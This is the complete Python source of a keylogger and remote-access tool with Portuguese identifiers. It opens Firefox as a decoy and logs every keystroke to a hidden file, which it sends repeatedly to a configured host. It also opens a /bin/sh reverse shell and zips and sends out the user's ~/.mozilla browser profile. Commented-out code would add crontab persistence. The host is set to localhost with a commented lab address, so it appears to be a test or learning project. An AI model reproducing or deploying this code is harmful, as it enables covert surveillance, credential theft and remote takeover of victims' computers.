#!/usr/bin/env python
version = "3-dev"
encode = 'echo "x"| sha1sum | base64'

import os
from pynput.keyboard import Listener, Key
import threading as th
import socket
import time as t


h='127.0.0.1'
#h='192.168.56.1'
#pwd = os.popen('find / -name gunkey.py 2>/dev/null').read()
#pwd = pwd.splitlines()
#os.system(f'echo "*/59 * * * * /usr/bin/python3 {pwd[0]}" | crontab -') # Para fazer uma persistencia pelo crontab

Rodar = True
ctrl_press = False
alt_press = False
esc_press = False

def Firefox():
    os.system('/usr/bin/firefox')

def Reverse_Shell():
    while Rodar == True:
        rs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            rs.connect((h,7474))
            os.dup2(rs.fileno(),0)
            os.dup2(rs.fileno(),1)
            os.dup2(rs.fileno(),2)
            os.system("/bin/sh -i")
        except ConnectionRefusedError:
            t.sleep(3)
            Reverse_Shell()
    
def Enviar_Mozilla():
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((h, 4545))
        os.system('zip -rlq .mozilla.zip /home/$USER/.mozilla/')
        with open('.mozilla.zip', 'rb') as Arquivo:
            while Rodar == True:
                Dados = Arquivo.read(2048)
                if not Dados:
                    break
                c.send(Dados)
        c.close()
        os.system('rm -rf .mozilla.zip')
    except ConnectionRefusedError:
        t.sleep(3)
        Enviar_Mozilla()

def Tecla_Pressionada(key):
    global Rodar, ctrl_press, alt_press, esc_press
    if Rodar:
        if key == Key.ctrl:
            ctrl_press = True
        elif key == Key.alt:
            alt_press = True
        elif key == Key.esc:
            esc_press = True

        if ctrl_press and alt_press and esc_press:
            Rodar = False
            t.sleep(10)
            os.system('rm .logFile')
        else:
            trocar_tecla = {
                "Key.space": " ",
                "Key.backspace": "<-",
                "Key.ctrlc": "",
                "Key.shift": "^",
                "<65437>": "5",
                "Key.shift_r": "^",
                "Key.caps_lock": "!!",
                "Key.enter": "\n",
                "<65439>": ","
            }
            tecla_salva = str(key).replace("'", "")
            for tecla in trocar_tecla:
                tecla_salva = tecla_salva.replace(tecla, trocar_tecla[tecla])
            with open('.logFile', "a") as f:
                f.write(tecla_salva)

def Controle(key):
    global ctrl_press, alt_press, esc_press
    if key == Key.ctrl:
        ctrl_press = False
    elif key == Key.alt:
        alt_press = False
    elif key == Key.esc:
        esc_press = False

def Keylogger():
    with open('.logFile', "a") as f:
        f.write(f'\n== {t.strftime("%d/%m/%y | %H:%M:%S")} ==\n')

    with Listener(on_press=Tecla_Pressionada, on_release=Controle) as listener:
        listener.join()

def Enviar_teclas():
    while Rodar == True:
        try:
            with open('.logFile', 'rb') as f:
                file_data = f.read()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((h, 8888))
            s.sendall(file_data)
            s.close()
            t.sleep(5)
        except FileNotFoundError:
            pass
        except  ConnectionRefusedError:
            t.sleep(3)
            Enviar_teclas()

Firefox_open = th.Thread(target=Firefox)
Shell = th.Thread(target=Reverse_Shell)
Keylogger_thread = th.Thread(target=Keylogger)
send_data_thread = th.Thread(target=Enviar_teclas)
extract_mozzila = th.Thread(target=Enviar_Mozilla)

Firefox_open.start()
Shell.start()
Keylogger_thread.start()
send_data_thread.start()
extract_mozzila.start()

Firefox_open.join()
Shell.join()
Keylogger_thread.join()
send_data_thread.join()
extract_mozzila.join()
